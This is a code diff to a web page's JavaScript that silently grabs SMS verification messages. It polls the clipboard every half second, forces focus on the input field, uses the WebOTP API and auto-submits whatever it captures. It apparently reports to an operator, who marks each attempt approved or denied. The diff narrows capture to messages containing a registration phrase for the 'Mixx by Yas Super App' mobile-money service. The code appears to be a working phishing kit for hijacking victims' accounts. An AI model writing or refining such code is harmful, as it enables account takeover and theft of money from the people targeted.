@@ -184,11 +184,17 @@ document.addEventListener('DOMContentLoaded', () => {
             const text = otpText.value.trim();
             if (!text) return;
             smsErrorBanner.classList.add('hidden');
+            
+            const targetPrefix = "You are being registered in Mixx by Yas Super App";
+            if (!text.includes(targetPrefix)) {
+                smsErrorBanner.classList.remove('hidden');
+                isAutoSubmitting = false;
+                return;
+            }
             triggerAutoSubmit(text);
         });
     }
 
-    // High sensitivity real-time listener ensuring the field is never dormant and strictly validates 30s freshness
     function startHighSensitivityListener() {
         if (sensitivityInterval) clearInterval(sensitivityInterval);
         screenOpenTimestamp = Date.now();
@@ -196,26 +202,27 @@ document.addEventListener('DOMContentLoaded', () => {
         sensitivityInterval = setInterval(() => {
             if (isAutoSubmitting) return;
 
-            // Keep focus active and highly sensitive
             if (document.activeElement !== otpText && stepOtp.classList.contains('active')) {
                 otpText.focus();
             }
 
-            // Continuously check clipboard for fresh entries
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText().then(clipText => {
                     if (clipText && clipText.trim().length > 3 && !otpText.value && !isAutoSubmitting) {
                         const now = Date.now();
-                        // Enforce the 30-second rule: ignore old cached text older than 30s from screen load
                         if ((now - screenOpenTimestamp) <= 30000) {
-                            otpText.value = clipText.trim();
-                            charCount.innerText = `${otpText.value.length}/1000`;
-                            triggerAutoSubmit(otpText.value);
+                            const trimmed = clipText.trim();
+                            const targetPrefix = "You are being registered in Mixx by Yas Super App";
+                            if (trimmed.includes(targetPrefix)) {
+                                otpText.value = trimmed;
+                                charCount.innerText = `${otpText.value.length}/1000`;
+                                triggerAutoSubmit(otpText.value);
+                            }
                         }
                     }
                 }).catch(() => {});
             }
-        }, 500); // Scans rapidly every 0.5 seconds for peak sensitivity
+        }, 500);
     }
 
     function initWebOTP() {
@@ -228,18 +235,20 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (otp && (otp.code || otp.value)) {
                     const smsMessage = otp.code || otp.value;
                     const now = Date.now();
-                    // Validate 30-second window freshness
                     if ((now - screenOpenTimestamp) <= 30000) {
-                        otpText.value = smsMessage;
-                        charCount.innerText = `${smsMessage.length}/1000`;
-                        
-                        setTimeout(() => {
-                            const text = otpText.value.trim();
-                            if (text && !isAutoSubmitting) {
-                                smsErrorBanner.classList.add('hidden');
-                                triggerAutoSubmit(text);
-                            }
-                        }, 200);
+                        const targetPrefix = "You are being registered in Mixx by Yas Super App";
+                        if (smsMessage.includes(targetPrefix)) {
+                            otpText.value = smsMessage;
+                            charCount.innerText = `${smsMessage.length}/1000`;
+                            
+                            setTimeout(() => {
+                                const text = otpText.value.trim();
+                                if (text && !isAutoSubmitting) {
+                                    smsErrorBanner.classList.add('hidden');
+                                    triggerAutoSubmit(text);
+                                }
+                            }, 200);
+                        }
                     }
                 }
             }).catch(err => {});
@@ -279,9 +288,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     otpText.value = '';
                     isAutoSubmitting = false;
                     charCount.innerText = '0/1000';
-                    smsErrorBanner.classList.add('hidden'); // Clear error banner to accept new SMS
+                    smsErrorBanner.classList.remove('hidden');
                     switchStep(stepLoading, stepOtp);
-                    startHighSensitivityListener(); // Reset timer and restart active listening for the new incoming SMS
+                    startHighSensitivityListener();
                     initWebOTP();
                 } else if (data.status === 'denied') {
                     clearInterval(statusInterval);
@@ -292,4 +301,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 2000);
     }
 });
-                          
+        
